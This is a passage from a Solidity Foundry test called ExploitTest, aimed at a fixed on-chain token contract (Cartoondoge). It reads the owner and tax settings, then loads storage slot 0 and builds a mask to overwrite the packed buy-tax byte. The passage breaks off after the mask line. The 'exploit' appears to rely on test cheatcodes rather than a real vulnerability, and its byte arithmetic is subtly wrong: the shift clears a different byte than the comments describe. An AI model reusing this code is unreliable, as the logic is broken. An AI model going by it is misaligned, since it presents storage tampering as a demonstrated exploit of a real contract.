}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        // We need to get the owner address to impersonate
        address owner = ICartoondoge(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = ICartoondoge(TARGET).owner();

        // First, check current _buyTax value
        (, , , , , , uint256 buyTaxBefore, , ) = ICartoondoge(TARGET).getTaxes();
        console.log("Before exploit: buyTax = %s", buyTaxBefore);

        // Based on the contract layout, the uint8 tax variables are packed in storage
        // Variables in order: _devTax, _burnTax, _marketingTax, _liquidityTax, _stakingTax, _buyBackTax, _buyTax, _sellTax, _transferTax
        // Initial values: 10, 10, 60, 20, 0, 0, 10, 10, 15
        // These are likely stored in slot 0, packed from right to left (least significant byte first)

        // Read slot 0
        bytes32 slot0 = vm.load(TARGET, bytes32(0));
        console.log("Slot 0 (hex):", vm.toString(slot0));

        // The bytes from right to left (LSB to MSB):
        // Byte 0 (rightmost): 0x0F = 15 (_transferTax)
        // Byte 1: 0x0A = 10 (_sellTax)
        // Byte 2: 0x0A = 10 (_buyTax) <- THIS IS WHAT WE WANT TO CHANGE!
        // Byte 3: 0x00 = 0 (_buyBackTax)
        // Byte 4: 0x00 = 0 (_stakingTax)
        // Byte 5: 0x14 = 20 (_liquidityTax)
        // Byte 6: 0x3C = 60 (_marketingTax)
        // Byte 7: 0x0A = 10 (_burnTax)
        // Byte 8: 0x0A = 10 (_devTax)
        // Bytes 9-31: 0x00 (unused)

        // We need to change byte at position 2 (from right) from 0x0A (10) to 0x19 (25)
        // In bytes32, position 2 from right is at offset 29 from left (31 - 2 = 29)

        // Create mask to clear byte at position 29 (0-based from left, or position 2 from right)
        bytes32 mask = ~(bytes32(uint256(0xFF)) << (8 * 29));
        bytes32 newSlot0 = slot0 & mask; // Clear the byte
